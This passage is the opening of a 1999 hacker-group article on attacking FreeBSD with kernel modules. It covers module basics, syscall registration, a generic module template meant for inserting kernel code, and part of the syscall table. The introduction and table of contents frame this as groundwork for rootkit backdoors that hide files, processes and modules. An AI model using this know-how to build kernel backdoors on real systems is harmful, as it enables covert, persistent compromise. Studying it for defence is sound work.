@@ -1,0 +1,4486 @@
+<HTML>
+<TITLE>- Attacking FreeBSD with Kernel Modules -</title>
+<BODY BGCOLOR=WHITE>
+<CENTER>
+<H1><FONT COLOR=#0000FF>
+                - Attacking FreeBSD with Kernel Modules -
+</H1></FONT>
+
+
+<H4>
+    The System Call Approach  
+</H4>
+
+</CENTER>
+<P>
+<H4><FONT COLOR=#FF0000>
+written by pragmatic / THC, version 1.0<br>
+released 06/1999<br>               
+</H4></font>
+
+
+
+<P><P><P><P><P><P>
+
+<CENTER>
+<H3>
+                                    CONTENTS
+</H3>
+</CENTER>
+                 
+                
+                     
+
+<A HREF="#Introduction"> Introduction</A><BR>
+<p>
+<b>
+<A HREF="#I.">I.Basics</A><BR>
+</b>
+<A HREF="#I.1.">1. FreeBSD 'Modules' - 'Hello World' Syscall Example</A><BR>
+<A HREF="#I.2.">2. Link Files and Modules - the difference </A><BR>
+<A HREF="#I.2.1.">2.1 A two in one example</A><BR>
+<A HREF="#I.3.">3. Diary of a module load process from the kernel
+perspective</A><BR> 
+<A HREF="#I.4.">4. Other kinds of modules</A><BR>
+<A HREF="#I.5.">5. MISC modules with the KLD scheme</A><BR>
+<A HREF="#I.6.">6. System calls on FreeBSD</A><BR>
+<A HREF="#I.6.1.">  6.1 Important system calls for hacking</A><BR>
+<A HREF="#I.7.">7. Important Kernel structures / lists</A><BR>
+<A HREF="#I.7.1.">  7.1 TheSeeker - or how to access kernel lists</A><BR>
+<A HREF="#I.8.">8. From User to kernel space and back</A><BR>
+<A HREF="#I.9.">9. Last Words</A><BR>
+<p>
+<p>
+<b>
+<A HREF="#II.">II. Attacking with kernel code</A><BR>
+</b>
+<A HREF="#II.1.">1. How to intercept Syscalls</A><BR>
+<A HREF="#II.2.">2. Filesystem related hacks</A><BR>
+<A HREF="#II.2.1.">2.1 How to hide files</A><BR>
+<A HREF="#II.2.2.">2.2 How to hide the file contents</A><BR>
+<A HREF="#II.2.3.">2.3 And the rest ?</A><BR>
+<A HREF="#II.3.">3. Process related hacks</A><BR>
+<A HREF="#II.3.1.">3.1 How to hide any process</A><BR>
+<A HREF="#II.3.2.">3.2 backdoor 'rootshell'</A><BR>
+<A HREF="#II.4.">4. file execution redirection</A><BR>
+<A HREF="#II.5.">5. TTY hijacking</A><BR>
+<A HREF="#II.6.">6. Hiding the module</A><BR>
+<A HREF="#II.7.">7. Last words</A><BR>
+<p>
+<p>
+<b>
+<A HREF="#III.">III. Securing the kernel</A><BR>
+</b>
+<A HREF="#III.1.">1. How to detect sysent[] modifications</A><BR>
+<A HREF="#III.2.">2. How to restore old system calls</A><BR>
+<A HREF="#III.3.">3. General ideas for using MD5 Hashes</A><BR>
+<A HREF="#III.4.">4. How to see a hidden process</A><BR>
+<p>
+<p>
+<b>
+<A HREF="#IV.">IV. Last things to mention</A><BR>
+</b>
+<A HREF="#IV.1.">1. What about OpenBSD and NetBSD</A><BR>
+<A HREF="#IV.2.">2. Links</A><BR>
+<A HREF="#IV.3.">3. Greetings</A><BR>
+
+
+<p>
+<H3><A NAME="Introduction"></A>Introduction</H3>
+<p>
+FreeBSD is an often used server operating system. Lots of ISPs, universities
+and some firms are using it. After releasing my Linux LKM text van Hauser asked
+my to take a look at the FreeBSD kernel, so here we go.<br>
+This text will show you that most Linux LKMs can be ported to BSD systems
+(FreeBSD). On FreeBSD we can even do some things that were harder to
+implement on Linux systems. This text only deals with ways to
+backdoor/intercept system calls. I had a little conversation with Solar
+Designer who tought me that there are lots of other ways to attack the FreeBSD
+kernel, but this will come in a further release.<br>
+For those people new to BSD and module techniques I really suggest reading my
+'(nearly) Complete Linux Loadable Kernel Module' article
+(http://www.thc.org). Of course this FreeBSD text has a basic section, but
+the basic part of the Linux text is much more comprehensive  and easier to
+understand. The Linux text will give you the basic ideas for understanding
+most stuff I mention here. People who already did some kernel coding under
+FreeBSD, who can read and understand kernel code and those who did some LKM
+hacking on Linux boxes can read on without any problems. Bear in mind that the
+main aim of this text is to show some new ideas to attack/backdoor FreeBSD
+systems, and not to teach you FreeBSD kernel coding. So I made it as short and
+complete as I can. I developed all modules on a FreeBSD 3.1 system (x86). I
+used the new KLD scheme - introduced by FreeBSD 3.0 - to insert kernel code.
+Older FreeBSD systems which work with LKMs (/dev/lkm) can also be used, but
+there must be some modifications to the code in order to make them work. The
+general ideas in this text should also work on OpenBSD and NetBSD.  For kernel
+gurus : Don't blame me for the bad coding style I used in this paper
+sometimes, but very compact code is harder to understand,to read  and even
+harder to explain. And please remember : This text is for educational purpose
+only !<br>
+ Note : I only know of one text dealing with the problems and solutions
+I describe here. That older text written by halflife (see Phrack Magazine  
+Volume 7, Issue 51 September 01, 1997, article 09) showed how to hide LKMs
+under FreeBSD 2.2 systems and how to hide certain files from directory
+listings (the goal was to avoid integrity checks). Due to the fact that you
+can do much more stuff with modules and that FreeBSD changed a lot (LKMs are
+gone...) I wrote this text.
+
+<p>
+<H3><A NAME="I."></A>I. Basics</H3>
+<p>
+This section will give you a very brief and easy (so partly incomplete) but
+working overview of the FreeBSD way to insert code via modules. <br>
+The problem concerning FreeBSD is the lack of documentation. There is only a
+very small and elite group of programmers working on the kernel. At the time
+of writing (May '99) I was not able to find any
+good documentation helping us to dive deep into the kernel. So we have to go
+the hardest but best way : reading source code. Because of this there may be
+some minor errors in some explainations I give you, but every piece of code is
+working and the general view should be correct ;)!<br>
+<p>
+<H3><A NAME="I.1."</A>1. FreeBSD 'Modules' - 'Hello World' Syscall Example</H3>
+<p>
+Before starting to explain I will present you a module example which installs
+a system call that will print a simple message on the screen. I also included
+the user space part. You may know this example, I took it from the FreeBSD
+distribution (I only added some comments).
+
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+
+
+/*this is the function which represents our system call*/
+static int
+hello (struct proc *p, void *arg)
+{
+ printf ("hello kernel\n");
+ return 0;
+}
+
+/*on FreeBSD every system call is described by a sysent structure, which holds
+the corresponding system call function (here hello) and the appropriate count
+of arguments (here 0)*/
+
+static struct sysent hello_sysent = {
+ 0,			/* sy_narg */
+ hello			/* sy_call */
+};
+
+
+/*every system call has a certain number (called slot or offset on BSD). This
+number represents the index in the global sysent list holding every syscall.
+BSD is able to search a free slot for a syscall (by setting it to NO_SYSCALL)
+which is used here.*/
+
+static int offset = NO_SYSCALL;
+
+/*this function can be compared to the init_module & cleanup_module functions
+on Linux. The differentiation is done via the cmd variable.*/
+
+static int
+load (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+
+ /*what do we have?*/
+ switch (cmd) {
+ /*we have a load*/
+ case MOD_LOAD :
+  printf ("syscall loaded at %d\n", offset);
+ break;
+ /*we have an unload*/
+ case MOD_UNLOAD :
+  printf ("syscall unloaded from %d\n", offset);
+ break;
+ default :
+  error = EINVAL;
+ break;
+ }
+ return error;
+}
+
+/*This is the most tricky part of this module. That macro will install the
+module and calls the required functions. We will take a deeper look at this
+later.*/
+SYSCALL_MODULE(syscall, &offset, &hello_sysent, load, NULL);
+</xmp>
+
+Compiling this module is very easy on FreeBSD. We just use an universal
+Makefile which is very easy because of the nice MK files used by FreeBSD (BSD).
+Here we go :
+<xmp>
+SRCS	= helloworld.c
+KMOD	= helloworld
+KO	= ${KMOD}.ko
+KLDMOD	= t
+
+
+.include <bsd.kmod.mk>
+</xmp>
+Aren't those MK file a good idea :). So after comiling you get a file called
+helloworld.ko. This file is in ELF format (so no pure object file). <br>
+Take a look at the FreeBSD user space example calling this system call.
+<xmp>
+#include <stdio.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/module.h>
+
+int
+main(int argc, char **argv)
+{
+ char *endptr;
+ int syscall_num;
+ struct module_stat stat;
+
+ stat.version = sizeof(stat);
+ /*modstat will retrieve the module_stat structure for our module named
+   syscall (see the SYSCALL_MODULE macro which sets the name to syscall)*/
+ modstat(modfind("syscall"), &stat);  
+ /*extract the slot (syscall) number*/
+ syscall_num = stat.data.intval;
+ /*and call it without any arguments (because we didn't include support for
+   arguments*/
+ return syscall (syscall_num);
+}
+</xmp>
+You can compile this the following way (it's too easy to waste time with a
+Makefile) :
+<xmp>
+# gcc -o call call.c
+</xmp>
+Now you have a working module which will install a system call you can
+call from user space with this little call program. 
+You can load the module with
+<xmp>
+# kldload ./helloworld.ko 
+</xmp>
+and unload with
+<xmp>
+# kldunlod helloworld
+</xmp>
+with 
+<xmp>
+# kldstat 
+</xmp>
+you will get a list of loaded link files (NOT modules).
+Before reading on, you should understand the global scheme used in the sources
+I presented here. 
+
+<p>
+<H3><A NAME="I.2."></A>2. Link Files and Modules - the difference</H3>
+<p>
+
+There is a big difference between the output presented by kldstat and the
+loaded modules. A module on FreeBSD means some part of the kernel, an exec
+driver, a system call module, a device driver... The kernel itself contains
+some modules (FS support for example).  A link file on the other hand is
+something like a wrapper which can hold lots of modules. So our helloworld
+example from above is one module wrapped in the link file helloworld.ko.<br>
+So in general words : A module is just a bit of structured kernel code that
+represents a certain driver (exec format, device, for example) or whatever. A
+link file is just a file holding one or more modules which will be inserted
+into the kernel. <br>
+For those who want to know it exactly; here is the definition by Doug Rabson :
+<xmp>
+Kernel Linker
+The kernel linker simply dynamically loads code into the kernel. A
+symbol table is included in the kernel by ld(1) in the same way as
+for dynamically linked user programs. As files are loaded, the code
+is relocated and any unresolved symbols are matched against the
+kernel's symbol table. Files can also include a list of dependencies
+to allow code which is common to several files to be loaded
+automatically. The kernel can load files without help from a user
+program (in contrast to the older LKM system) and the kernel
+bootstrap can also pre-load files, allowing devices which needed
+before the root disk is available to be dynamically loaded instead of
+statically linked into the kernel.
+As code is loaded, any SYSINITs which it contains are
+run. This makes it possible to write code which is identical whether
+it is statically or dynamically loaded. When a file is unloaded, a
+similar list of functions defined by SYSUNINIT is run.
+<p>
+Modules
+Layered on top of the kernel linker is the module system. It uses
+a SYSINIT to implement a simple event system for code which
+is loaded. The idea is that a piece of code defines a module (using
+DECLARE_MODULE) and supplies a handler routine. The handler
+is called at load, unload and shutdown to allow the module to
+initialise itself. Various kernel subsystems provide generic handler
+functions for registering filesystems, devices or whatever and they
+generally provide a macro which wraps DECLARE_MODULE (e.g.
+VFS_SET).
+</xmp>
+I hope you got the idea, if not read on and re-read this part until you
+understand it totally.
+
+<p>
+<H3><A NAME="I.2.1."></A>2.1 A two in one example</H3>
+<p>
+
+This example is just a proof of concept. It shows how to pack two modules in
+one file using the linker mechanics (two SYSINITs wrapped by SYSCALL_MODULE
+macro).
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+
+/*this is the function our first syscall module (syscall_1) will use*/
+static int
+hello_1 (struct proc *p, void *arg)
+{
+ printf ("hello kernel from syscall_1\n");
+ return 0;
+}
+
+/*this is the function our second syscall module (syscall_2) will use*/
+static int
+hello_2 (struct proc *p, void *arg)
+{
+ printf ("hello kernel from syscall_2\n");
+ return 0;
+}
+
+
+/*first sysent structure which describes the first system call*/
+static struct sysent hello_sysent_1 = {
+ 0,			/* sy_narg */
+ hello_1		/* sy_call */
+};
+
+
+/*second sysent structure which describes the second system call*/
+static struct sysent hello_sysent_2 = {
+ 0,			/* sy_narg */
+ hello_2		/* sy_call */
+};
+
+
+/*both system call slots (numbers) should be selected by the kernel*/
+static int offset_1 = NO_SYSCALL;
+static int offset_2 = NO_SYSCALL;
+
+/*the two load functions*/
+static int
+load_1 (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+
+ switch (cmd) {
+ case MOD_LOAD :
+	printf ("syscall_1 loaded at %d\n", offset_1);
+	break;
+ case MOD_UNLOAD :
+	printf ("syscall_1 unloaded from %d\n", offset_1);
+	break;
+ default :
+	error = EINVAL;
+        break;
+ }
+ return error;
+}
+
+static int
+load_2 (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+
+ switch (cmd) {
+ case MOD_LOAD :
+	printf ("syscall_2 loaded at %d\n", offset_2);
+	break;
+ case MOD_UNLOAD :
+	printf ("syscall_2 unloaded from %d\n", offset_2);
+	break;
+ default :
+	error = EINVAL;
+	break;
+ }
+ return error;
+}
+
+/*install the first module (NAME : syscall_1)*/
+SYSCALL_MODULE(syscall_1, &offset_1, &hello_sysent_1, load_1, NULL);
+
+/*install the second module (NAME : syscall_2)*/
+SYSCALL_MODULE(syscall_2, &offset_2, &hello_sysent_2, load_2, NULL);
+
+</xmp>
+You can use the same Makefile for the link file above. As you can see I
+duplicated every item in this file. This way I implemented two totally
+independend modules packed in one link file. The name of the first module is
+'syscall_1' and the second module's name is 'syscall_2'.<br>
+The following piece of code is the needed user space part which will find
+both  modules and call their system calls.
+<xmp>
+#include <stdio.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/module.h>
+
+
+int
+main(int argc, char **argv)
+{
+ char *endptr;
+ int syscall_num;
+ struct module_stat stat;
+
+ /*first module*/
+ stat.version = sizeof(stat);
+ modstat(modfind("syscall_1"), &stat);
+ syscall_num = stat.data.intval;
+ syscall (syscall_num);
+ 
+ /*second module*/
+ stat.version = sizeof(stat);
+ modstat(modfind("syscall_2"), &stat);
+ syscall_num = stat.data.intval;
+ syscall (syscall_num);
+}
+</xmp>
+After this example you should understand the concept of packing modules in
+link files.
+
+<p>
+<H3><A NAME="I.3."></A>3. Diary of a module load process from the kernel
+perspective</H3>
+<p>
+For total Beginners : I suppose those without a going C and BSD knowledge have
+to 'fight' with this part but I can't loose too many words here (the text would
+become far too big); so I pack everything in a short summary. This section is
+only a very brief and not very deep introduction into the module / link file
+handling made by the kernel, but it is enough to understand the rest of this
+text. <br>
+The following code represents the helloworld example in a form where I
+'resolved' the SYSCALL_MODULE macro. I just coded everything by hand (only the
+last part [SYSCALL_MODULE macro] changed) so things become clearer:
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+
+static int
+hello (struct proc *p, void *arg)
+{
+ printf ("hello kernel from syscall_1\n");
+ return 0;
+}
+
+static struct sysent hello_sysent = {
+ 0,		/* sy_narg */
+ hello		/* sy_call */
+};
+
+static int offset = NO_SYSCALL;
+
+static int
+load (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+
+ switch (cmd) {
+ case MOD_LOAD :
+ 	printf ("syscall loaded at %d\n", offset);
+	break;
+ case MOD_UNLOAD :
+	printf ("syscall unloaded from %d\n", offset);
+	break;
+ default :
+	error = EINVAL;
+	break;
+ }
+ return error;
+}
+
+
+/*The following lines do the same as :
+--------------------------------------
+SYSCALL_MODULE(syscall, &offset, &hello_sysent, load, NULL);
+*/
+
+/*fill the X_syscall_mod structure made only for syscall modules*/
+static struct syscall_module_data syscall_syscall_mod = {  
+ load, NULL, &offset, &hello_sysent                          
+};                                                         
+                                                          
+/*fill the module structure; the same for any module*/          
+static moduledata_t syscall_mod = {
+ "syscall", 
+ syscall_module_handler,   /*special handler for syscall modules*/
+ &syscall_syscall_mod      /*speciel syscall module data*/
+};
+
+/*the sysinit structure for starting / registering*/
+static struct sysinit syscall_sys_init = {
+ SI_SUB_DRIVERS,         /*SUBSYSTEM*/
+ SI_ORDER_MIDDLE,        /*ORDER*/
+ module_register_init,   /*the same for any module, register function*/
+ &syscall_mod            /*module specific data*/
+};
+
+/*we want hack at this layer, it just initializing some regions*/
+static void const * const
+__set_sysinit_set_sym_syscall_sys_init=&syscall_sys_init;	
+__asm(".section .set.""sysinit_set"",\"aw\"");		 	  
+__asm(".long " "syscall_sys_init");				 
+__asm(".previous");
+
+</xmp>
+Now let's start from the kldload command which is implemented as a system call
+in kern_linker.c. This system call first checks the securelevel (if > 0 then it
+won't work) after this it will check for UID=0. Then the kernel checks
+whether this link file is already loaded, if so it will abort. If everything
+is ok so far, it will call linker_load_file (kern_linker.c). After some checks
+this function will fill a linker_file structure and pass it to
+linker_file_sysinit (kern_linker.c). This function will use the
+syscall_sysinit_set structure (see example above) for initialization. That
+structure is defined in kernel.h. Normally it is defined by macros
+(we used the hand-made approach to see things clear). Here is the structure :
+<xmp>
+struct sysinit {
+	unsigned int	subsystem;		/* subsystem identifier*/
+	unsigned int	order;			/* init order within subsystem*/
+	void		(*func) __P((void *));	/* init function*/
+	void		*udata;			/* multiplexer/argument */
+	si_elem_t	type;			/* sysinit_elem_type*/
+};
+</xmp>
+The type field is set automatically so I did not set it by hand. The subsystem
+and order codes are also defined in kernel.h. The function pointer points to a
+function that is called at module startup with udata as parameter. As you can
+see in the example above the module_register_init function (kern_module.c) is
+called with the module data structure holding the module specific data. So our
+next step must be this function. <br>
+This function extracts the data from the argument it gets (the module data
+structure). After this the module_register function (kern_module.c) is called
+with the extracted data. This function first sets some fields of the module
+structure (represented by a pointer to it called module_t) which is used by the
+kernel to descibe any loaded module. After setting every field the module
+(represented by the now filled module structure) is added to the global
+module list (called modules). For a better understanding I put the module
+structure here plus a short description :
+<xmp>
+struct module {
+ /*the first two entries are just for global module handling*/
+ TAILQ_ENTRY(module) link;    
+ TAILQ_ENTRY(module) flink;
+ /*this linker_file structure describes the link file the module comes from*/
+ struct linker_file* file;
+ /*references to this module (reference cound)*/
+ int refs;
+ /*id of this module*/
+ int id;
+ /*name of this module*/
+ char *name;
+ /*the mod handler (in our case the load function)*/
+ modeventhand_t handler;
+ /*arguments to the mod handler*/
+ void *arg;
+ /*some - for us not very interesting - data fields*/
+ modspecific_t data;
+}
+</xmp>
+Finally the module_register function calls the modeventhand_t field of the
+module structure (in our case : the syscall_module_handler) with the MOD_LOAD
+command (cmd see example) argument. This function is defined in
+kern_syscalls.c. On MOD_LOAD it calls syscall_register
+(kern_syscalls.c) with the new sysentry and other stuff needed for installing
+the system call. So let's say that syscall_register installed the system call
+and returns (this stuff is not so interesting for us, we will use a more easy
+way to 'hack' system calls). The last piece of code in syscall_module_handler
+calls the self-defined load function (see example) with the same command field
+(on startup MOD_LOAD). This way the module developer is able to do his own
+stuff on LOAD and UNLOAD.<br>
+Now we are ready. The module is loaded and started, and the system call is
+installed. Recall that this example was written for a specific module - a
+SYSCALL_MODULE. There are other module types (like device drivers etc.).
+Please read the Kernel sources again and again and compare them to this part. 
+Everything should be clear.
+
+<p>
+<H3><A NAME="I.4."></A>4. Other kinds of module</h3>
+<p>
+As I said before the helloworld example module is a special so called
+SYSCALL_MODULE that is used to install a certain system call. FreeBSD provides
+other macros and module layouts for different aims. Take a look at the driver
+example that is shipped with FreeBSD. I won't discuss it here, because we will
+never use the standard way of coding FreeBSD forces us to. <br>
+The next section will show how to become independent from those standard
+module layouts.
+
+<p>
+<H3><A NAME="I.5."></A>5. MISC modules with the KLD scheme</h3>
+<p>
+When I first coded some modules on FreeBSD (on an older 2.2.x release) I was
+able to use so called MISC_MODULES. Instead of providing a certain layout for
+special purposes (like SYSCALL_MODULE for system calls etc.) a MISC_MODULE was
+just some piece of code loaded into the kernel, and calling the 'load' function
+written by me. This scheme was ideal for hacking, because I was not forced to
+implement a special kind of module. I had a fast and easy way to insert any
+kernel code. These days are gone on FreeBSD 3.x because the KLD scheme
+provides no MISC_MODULES like the LKM one did. So my first modules (like a
+hide module etc.) did the hacking part, but also installed a system call (I
+used SYSCALL_MODULES). This was no good solution. So I decided to create a
+general module layout which will do the same like the old MISC_MODULES on LKM
+systems : just call a 'load' function and nothing else. <br>
+The following piece of code represents a MISC_MODULE for FreeBSD 3.x
+systems using the KLD method :
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+
+/*our own 'load' function*/
+static int
+dummy_handler(struct module *mod, int what, void *arg)
+{
+ switch(what)
+ {
+  case MOD_LOAD :
+   printf("LOAD\n");
+  break;
+  case MOD_UNLOAD : 
+   printf("UNLOAD\n");
+  break; 
+ }
+ return 0;
+} 
+
+
+/*NOTE : The following stuff 'links' our module into the kernel and calls
+         dummy_handler as our installation routine. I didn't use any macro
+         supplied by some header file for making module coding a bit easier.
+         But this way you will see every piece of code responsible for loading
+         the module.
+*/
+                                                     
+/*fill the module structure*/          
+static moduledata_t dummy_mod = {
+ "dummy", 
+ dummy_handler,           /*normally you would find something like
+                            syscall_module_handler here*/
+ NULL                     /*normally you would find something like
+                            syscall_module_data here (argument for the
+                            syscall_module_handler)*/
+};
+
+/*the rest is the same*/  
+static struct sysinit syscall_sys_init = {
+ SI_SUB_DRIVERS,         /*SUBSYSTEM*/
+ SI_ORDER_MIDDLE,        /*ORDER*/
+ module_register_init,   /*the same for any module*/
+ &dummy_mod            /*data*/
+};
+
+
+/*We can leave this the same, it will work without modification...*/
+static void const * const
+__set_sysinit_set_sym_syscall_sys_init=&syscall_sys_init;	
+__asm(".section .set.""sysinit_set"",\"aw\"");		 	  
+__asm(".long " "syscall_sys_init");				 
+__asm(".previous");
+
+</xmp>
+Compile this module and load it. The only thing it will do is printing a string
+on load and unload. I must admit that the module above is a bit too long for
+everyday coding. So I use one macro defined by the system which will make the
+module a bit shorter but acting the same way. Replace the last lines with
+
+<xmp>
+...
+          
+static moduledata_t dummy_mod = {
+ "dummy", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(dummy, dummy_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</xmp>
+Now our module is quite short and works like a MISC_MODULE on LKM systems.
+Any code we want to execute on the kernel layer can be written into the
+dummy_handler function.
+
+<p>
+<H3><A NAME="I.6."></A>6. System calls on FreeBSD</h3>
+<p>
+My Linux LKM article did a quite good job in explaining the way system calls
+in general work. I won't repeat those words here, so I only give you BSD
+relevant and needed material.<br>
+The following list represents every system call that is present by startup on
+a FreeBSD 3.1 system (I took this list form init_sysents.c):
+<xmp>
+struct sysent sysent[] = {
+	{ 0, (sy_call_t *)nosys },			/* 0 = syscall */
+	{ 1, (sy_call_t *)exit },			/* 1 = exit */
+	{ 0, (sy_call_t *)fork },			/* 2 = fork */
+	{ 3, (sy_call_t *)read },			/* 3 = read */
+	{ 3, (sy_call_t *)write },			/* 4 = write */
+	{ 3, (sy_call_t *)open },			/* 5 = open */
+	{ 1, (sy_call_t *)close },			/* 6 = close */
+	{ 4, (sy_call_t *)wait4 },			/* 7 = wait4 */
+	{ compat(2,creat) },		/* 8 = old creat */
+	{ 2, (sy_call_t *)link },			/* 9 = link */
+	{ 1, (sy_call_t *)unlink },			/* 10 = unlink */
+	{ 0, (sy_call_t *)nosys },			/* 11 = obsolete execv */
+	{ 1, (sy_call_t *)chdir },			/* 12 = chdir */
+	{ 1, (sy_call_t *)fchdir },			/* 13 = fchdir */
+	{ 3, (sy_call_t *)mknod },			/* 14 = mknod */
+	{ 2, (sy_call_t *)chmod },			/* 15 = chmod */
+	{ 3, (sy_call_t *)chown },			/* 16 = chown */
+	{ 1, (sy_call_t *)obreak },			/* 17 = break */
+	{ 3, (sy_call_t *)getfsstat },			/* 18 = getfsstat */
+	{ compat(3,lseek) },		/* 19 = old lseek */
+	{ 0, (sy_call_t *)getpid },			/* 20 = getpid */
+	{ 4, (sy_call_t *)mount },			/* 21 = mount */
+	{ 2, (sy_call_t *)unmount },			/* 22 = unmount */
+	{ 1, (sy_call_t *)setuid },			/* 23 = setuid */
+	{ 0, (sy_call_t *)getuid },			/* 24 = getuid */
+	{ 0, (sy_call_t *)geteuid },			/* 25 = geteuid */
+	{ 4, (sy_call_t *)ptrace },			/* 26 = ptrace */
+	{ 3, (sy_call_t *)recvmsg },			/* 27 = recvmsg */
+	{ 3, (sy_call_t *)sendmsg },			/* 28 = sendmsg */
+	{ 6, (sy_call_t *)recvfrom },			/* 29 = recvfrom */
+	{ 3, (sy_call_t *)accept },			/* 30 = accept */
+	{ 3, (sy_call_t *)getpeername },		/* 31 = getpeername */
+	{ 3, (sy_call_t *)getsockname },		/* 32 = getsockname */
+	{ 2, (sy_call_t *)access },			/* 33 = access */
+	{ 2, (sy_call_t *)chflags },			/* 34 = chflags */
+	{ 2, (sy_call_t *)fchflags },			/* 35 = fchflags */
+	{ 0, (sy_call_t *)sync },			/* 36 = sync */
+	{ 2, (sy_call_t *)kill },			/* 37 = kill */
+	{ compat(2,stat) },		/* 38 = old stat */
+	{ 0, (sy_call_t *)getppid },			/* 39 = getppid */
+	{ compat(2,lstat) },		/* 40 = old lstat */
+	{ 1, (sy_call_t *)dup },			/* 41 = dup */
+	{ 0, (sy_call_t *)pipe },			/* 42 = pipe */
+	{ 0, (sy_call_t *)getegid },			/* 43 = getegid */
+	{ 4, (sy_call_t *)profil },			/* 44 = profil */
+	{ 4, (sy_call_t *)ktrace },			/* 45 = ktrace */
+	{ 3, (sy_call_t *)sigaction },			/* 46 = sigaction */
+	{ 0, (sy_call_t *)getgid },			/* 47 = getgid */
+	{ 2, (sy_call_t *)sigprocmask },		/* 48 = sigprocmask */
+	{ 2, (sy_call_t *)getlogin },			/* 49 = getlogin */
+	{ 1, (sy_call_t *)setlogin },			/* 50 = setlogin */
+	{ 1, (sy_call_t *)acct },			/* 51 = acct */
+	{ 0, (sy_call_t *)sigpending },			/* 52 = sigpending */
+	{ 2, (sy_call_t *)sigaltstack },		/* 53 = sigaltstack */
+	{ 3, (sy_call_t *)ioctl },			/* 54 = ioctl */
+	{ 1, (sy_call_t *)reboot },			/* 55 = reboot */
+	{ 1, (sy_call_t *)revoke },			/* 56 = revoke */
+	{ 2, (sy_call_t *)symlink },			/* 57 = symlink */
+	{ 3, (sy_call_t *)readlink },			/* 58 = readlink */
+	{ 3, (sy_call_t *)execve },			/* 59 = execve */
+	{ 1, (sy_call_t *)umask },			/* 60 = umask */
+	{ 1, (sy_call_t *)chroot },			/* 61 = chroot */
+	{ compat(2,fstat) },		/* 62 = old fstat */
+	{ compat(4,getkerninfo) },		/* 63 = old getkerninfo */
+	{ compat(0,getpagesize) },		/* 64 = old getpagesize */
+	{ 3, (sy_call_t *)msync },			/* 65 = msync */
+	{ 0, (sy_call_t *)vfork },			/* 66 = vfork */
+	{ 0, (sy_call_t *)nosys },			/* 67 = obsolete vread */
+	{ 0, (sy_call_t *)nosys },			/* 68 = obsolete vwrite */
+	{ 1, (sy_call_t *)sbrk },			/* 69 = sbrk */
+	{ 1, (sy_call_t *)sstk },			/* 70 = sstk */
+	{ compat(6,mmap) },		/* 71 = old mmap */
+	{ 1, (sy_call_t *)ovadvise },			/* 72 = vadvise */
+	{ 2, (sy_call_t *)munmap },			/* 73 = munmap */
+	{ 3, (sy_call_t *)mprotect },			/* 74 = mprotect */
+	{ 3, (sy_call_t *)madvise },			/* 75 = madvise */
+	{ 0, (sy_call_t *)nosys },			/* 76 = obsolete vhangup */
+	{ 0, (sy_call_t *)nosys },			/* 77 = obsolete vlimit */
+	{ 3, (sy_call_t *)mincore },			/* 78 = mincore */
+	{ 2, (sy_call_t *)getgroups },			/* 79 = getgroups */
+	{ 2, (sy_call_t *)setgroups },			/* 80 = setgroups */
+	{ 0, (sy_call_t *)getpgrp },			/* 81 = getpgrp */
+	{ 2, (sy_call_t *)setpgid },			/* 82 = setpgid */
+	{ 3, (sy_call_t *)setitimer },			/* 83 = setitimer */
+	{ compat(0,wait) },		/* 84 = old wait */
+	{ 1, (sy_call_t *)swapon },			/* 85 = swapon */
+	{ 2, (sy_call_t *)getitimer },			/* 86 = getitimer */
+	{ compat(2,gethostname) },		/* 87 = old gethostname */
+	{ compat(2,sethostname) },		/* 88 = old sethostname */
+	{ 0, (sy_call_t *)getdtablesize },		/* 89 = getdtablesize */
+	{ 2, (sy_call_t *)dup2 },			/* 90 = dup2 */
+	{ 0, (sy_call_t *)nosys },			/* 91 = getdopt */
+	{ 3, (sy_call_t *)fcntl },			/* 92 = fcntl */
+	{ 5, (sy_call_t *)select },			/* 93 = select */
+	{ 0, (sy_call_t *)nosys },			/* 94 = setdopt */
+	{ 1, (sy_call_t *)fsync },			/* 95 = fsync */
+	{ 3, (sy_call_t *)setpriority },		/* 96 = setpriority */
+	{ 3, (sy_call_t *)socket },			/* 97 = socket */
+	{ 3, (sy_call_t *)connect },			/* 98 = connect */
+	{ compat(3,accept) },		/* 99 = old accept */
+	{ 2, (sy_call_t *)getpriority },		/* 100 = getpriority */
+	{ compat(4,send) },		/* 101 = old send */
+	{ compat(4,recv) },		/* 102 = old recv */
+	{ 1, (sy_call_t *)sigreturn },			/* 103 = sigreturn */
+	{ 3, (sy_call_t *)bind },			/* 104 = bind */
+	{ 5, (sy_call_t *)setsockopt },			/* 105 = setsockopt */
+	{ 2, (sy_call_t *)listen },			/* 106 = listen */
+	{ 0, (sy_call_t *)nosys },			/* 107 = obsolete vtimes */
+	{ compat(3,sigvec) },		/* 108 = old sigvec */
+	{ compat(1,sigblock) },		/* 109 = old sigblock */
+	{ compat(1,sigsetmask) },		/* 110 = old sigsetmask */
+	{ 1, (sy_call_t *)sigsuspend },			/* 111 = sigsuspend */
+	{ compat(2,sigstack) },		/* 112 = old sigstack */
+	{ compat(3,recvmsg) },		/* 113 = old recvmsg */
+	{ compat(3,sendmsg) },		/* 114 = old sendmsg */
+	{ 0, (sy_call_t *)nosys },			/* 115 = obsolete vtrace */
+	{ 2, (sy_call_t *)gettimeofday },		/* 116 = gettimeofday */
+	{ 2, (sy_call_t *)getrusage },			/* 117 = getrusage */
+	{ 5, (sy_call_t *)getsockopt },			/* 118 = getsockopt */
+	{ 0, (sy_call_t *)nosys },			/* 119 = resuba */
